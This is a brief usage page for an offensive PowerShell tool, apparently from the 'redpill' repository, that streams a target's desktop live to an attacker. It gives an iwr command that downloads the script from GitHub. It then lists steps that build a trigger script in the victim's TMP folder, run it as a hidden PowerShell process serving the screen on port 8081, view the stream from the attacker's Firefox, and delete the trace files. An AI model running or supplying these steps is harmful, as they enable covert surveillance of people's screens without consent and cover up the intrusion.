## Stream-TargetDesktop.ps1

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|[Stream-TargetDesktop](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1)|Stream target desktop live|User Land|Dependencies: firefox browser with MJPEG (attacker)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1" -OutFile "Stream-TargetDesktop.ps1"
```

<br />

**execute:**
```powershell
#Build triggers script (remote)
echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
Add-Content -Path "$Env:TMP\trigger.ps1" -Value "TargetScreen -Bind -Port 8081"


#Start capture desktop (remote)
Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"

#Access live stream (attacker)
Start firefox on: "http://${RemoteHost}:8081"


#Stop stream (remote)
$StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' }
Stop-Process -id $StreamPid -EA SilentlyContinue -Force

#CleanUp (remote)
Remove-Item -Path "$Env:TMP\trigger.ps1" -Force
Remove-Item -Path "$Env:TMP\mypid.log" -Force
```
